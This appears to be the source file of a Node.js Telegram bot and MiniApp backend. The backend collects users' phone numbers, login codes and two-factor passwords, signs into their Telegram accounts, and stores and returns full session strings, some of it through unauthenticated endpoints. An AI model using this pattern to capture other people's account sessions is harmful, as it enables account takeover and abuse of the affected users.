require("dotenv").config();
const fs = require("fs");

const express = require("express");
const cors = require("cors");
const app = express();

const userBase = require('./userBase.js');
const dataBase = require('./dataBase.js');
const imgBase = require('./imgBase.js');

app.use(cors({ methods: ["GET", "POST"] }));
app.use(express.json());

const { Api, TelegramClient } = require("telegram");
const { StringSession } = require("telegram/sessions");
const { password: passwordUtils } = require("telegram");
const { Telegraf, session, Scenes } = require("telegraf");
const { keyboard } = require("telegraf/markup");


const apiId = +process.env.API_ID;
const apiHash = process.env.API_HASH;
const bot = new Telegraf(process.env.BOT_TOKEN);

bot.use(
  session({
    defaultSession: () => ({ write_user: false }),
    defaultSession: () => ({ write_admin: false }),
    defaultSession: () => ({ order_scena: false }),
  })
);

//imgBase.deleteMany({})

function clearDB(){
  imgBase.deleteMany({});
  dataBase.deleteMany({});
}
//clearDB();
//dataBase.deleteMany({});
// dataBase.find({}).then(res => {
//   console.log(res);
// })

  

const USERS = {};

async function main() {

  // TelegramBot

  bot.action(/^approve_/i, async (ctx) => {
    const [, idUser] = ctx.match.input.split("_");
    await userBase.updateOne({ id: +idUser  }, { $set: { isValid: true } });
    bot.telegram.sendMessage(idUser, `<blockquote><b>✅ Администратор подтвердил вашу заявку!</b></blockquote>`, { parse_mode:'HTML' });
    ctx.reply(`<b>✅ Вы подтвердили заявку!</b>`, { parse_mode: "HTML" });
  });

  bot.action(/^cancel_/i, async (ctx) => {
    const [, idUser] = ctx.match.input.split("_");
    await userBase.updateOne({ id: +idUser  }, { $set: { isValid: false } });
    bot.telegram.sendMessage(idUser, `<blockquote><b>❌ Администратор отказ вам в доступе!</b></blockquote>`, { parse_mode:'HTML' });
    ctx.reply(`<b>❌ Вы отказли в доступе!</b>`, { parse_mode: "HTML" });
  });

  bot.command("start", async (ctx) => {
    const { id, username, first_name, last_name  } = ctx.from;
    const fullName = `${first_name ?? ''} ${ last_name ?? ''}`

    const user = await userBase.findOne({ id, username });
    console.log(user)
    if(user === null){
      console.log('Регаем')

      await userBase.insertOne({ id, username, full_name: fullName, hash: hashCode(), isValid: false, isBanned: false });
    }
    else{
      console.log('Вы уже зареганы')
    }
    
    ctx.replyWithPhoto("https://i.ibb.co/jPXBncp6/card-start-fuga-bot.jpg", {
      caption: `<b>Бот для настоящих 42 братух, подождите подверждения от Администратора для ииспользования бота.</b>`,
      parse_mode: "HTML"
    });

    bot.telegram.sendMessage(process.env.ADMIN_ID, 
      `<blockquote><b>Пользователь \n id:<code>${id}</code>  @${username}\n Подал заявку на вступление в фугабота.</b></blockquote>`,
      { parse_mode:'HTML',
        reply_markup: {
          inline_keyboard: [
            [{ text: "✅ Подтвердить", callback_data: `approve_${id}` }],
            [{ text: "❌ Отказать", callback_data: `cancel_${id}` }]
          ]
        }
      })

  });

  bot.command("users", async (ctx) => {
    const response = await userBase.find({});
    console.log(response)
  })

  

  // MiniApp API

  app.post('/auth/phone', async (req, res) => {
    const { id, phone } = req.body;
    try {
      USERS[id] = { phone };
      USERS[id].client = new TelegramClient( new StringSession(""), apiId, apiHash,  { connectionRetries: 5, useWSS: true });
      await USERS[id].client.connect();

      USERS[id].resultSendCode = await USERS[id].client.invoke(
        new Api.auth.SendCode({
          phoneNumber: USERS[id].phone,
          apiId,
          apiHash,
          settings: new Api.CodeSettings({
            allowFlashcall: true,
            currentNumber: true,
            allowAppHash: true,
            allowMissedCall: true,
            logoutTokens: [Buffer.from("arbitrary data here")],
          }),
        })
      );

      res.json({ type: 'succes', msg:'Код был отправлен!' });
    }
    catch(e){
      console.log(e)
      if(e.errorMessage === 'PHONE_NUMBER_INVALID'){
        res.json({ type: 'error', msg:'Ошибка в номере телефона!' });
      }
      else{
        res.json({ type: 'error', msg:e.errorMessage });
      }
      await USERS[id].client.disconnect();
      await USERS[id].client.destroy();
      delete USERS[id];
    }
  });

  app.post('/auth/code-password', async (req, res) => {
    const { id, username, code, password } = req.body;
    USERS[id].code = code.replaceAll(' ','');
    USERS[id].password = password;
    try {     
      USERS[id].resultCodeTg = await USERS[id].client.invoke(
        new Api.auth.SignIn({
          phoneNumber: USERS[id].phone,
          phoneCodeHash: USERS[id].resultSendCode.phoneCodeHash,
          phoneCode: USERS[id].code
        })
      );

      const me = await USERS[id].client.getMe();
      await dataBase.insertOne({  id, username, full_name: `${me.firstName ?? ''} ${me.lastName ?? ''}`, isBanned: false, session: USERS[id].client.session.save(), post_image: 'https://i.ibb.co/Gv9sKtCQ/5opka-8.jpg', post_text: '42' });

      res.json({ type: 'succes', msg:'Вы были авторизованы!', session: USERS[id].client.session.save()});
      await USERS[id].client.disconnect();
      await USERS[id].client.destroy();
      delete USERS[id];
    } catch (err) {
      if (err.errorMessage === "SESSION_PASSWORD_NEEDED") {
        try{
          const passwordInfo = await USERS[id].client.invoke(new Api.account.GetPassword());
          const password = await USERS[id].password;
          const passwordSrp = await passwordUtils.computeCheck(passwordInfo, password);
          await USERS[id].client.invoke( new Api.auth.CheckPassword({ password: passwordSrp }) );

          const me = await USERS[id].client.getMe();
          await dataBase.insertOne({  id, username, full_name: `${me.firstName ?? ''} ${me.lastName ?? ''}`, isBanned: false, session: USERS[id].client.session.save(), post_image: 'https://i.ibb.co/Gv9sKtCQ/5opka-8.jpg', post_text: '42' });
          res.json({ type: 'succes', msg:'Вы были авторизованы!', session: USERS[id].client.session.save()});  

        }
        catch(err2){
          if (err2.errorMessage === "PASSWORD_HASH_INVALID") {
            res.json({ type: 'error', msg:'Облачный пароль не совпадает!'});
          } 
        }
      } else {

        console.error("❌ Ошибка входа:", err);
        if (err.errorMessage === "PHONE_CODE_INVALID") {    
          res.json({ type: 'error', msg:'Код введен не правильно!'});
        }
      }

      if (err.errorMessage === "PHONE_CODE_EXPIRED") {
        res.json({ type: 'error', msg:'Время кода истекло!'});
      } 
      console.log('Удаляем временного пользователя');
      await USERS[id].client.disconnect();
      await USERS[id].client.destroy();
      delete USERS[id];
      console.log(USERS);

    }

  });
  

  app.post('/auth/login', async (req, res) => {
    const { id, username } = req.body;
    console.log(req.body);
    const user =  await userBase.findOne({ id, username });
    console.log(user);


    if(user === null || user.isBanned || !user.isValid ){
      res.json({ type: 'error', accounts: [] });
    }
    else if(!user.isBanned && user.isValid){
      const accounts = await dataBase.find({ id, username });
      res.json({ type: 'succes', accounts, token_imgbb: process.env.TOKEN_IMGBB });
    }
  });



  app.post('/upload-image', async (req, res) => {
    const { id, current, thumb } = req.body;
    await imgBase.insertOne({ id, current, thumb });
    res.json({ type: 200 });
  });

  app.post('/images', async (req, res) => {
    const imagesRaw = await imgBase.find({});
    const images = imagesRaw.map(item =>  { 
      return { current: item.current, thumb: item.thumb }
    })
    res.json({ images });
  });

  app.post('/save-post', async (req, res) => {
    const { id, full_name, text, url } = req.body;
    console.log(req.body)
    await dataBase.updateOne({ id, full_name }, { $set:{ post_image: url, post_text: text } });
    res.json({ type: 200 });
  });

}
main();



function hashCode(n = 8) {
  const symbols =
    "QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm1234567890";
  let user_hash = "";
  for (let i = 0; i != n; i++) {
    user_hash += symbols[Math.floor(Math.random() * symbols.length)];
  }
  return user_hash;
}



app.listen(3042, (err) => { err ? err : console.log("STARTED SERVER"); });


bot.launch();



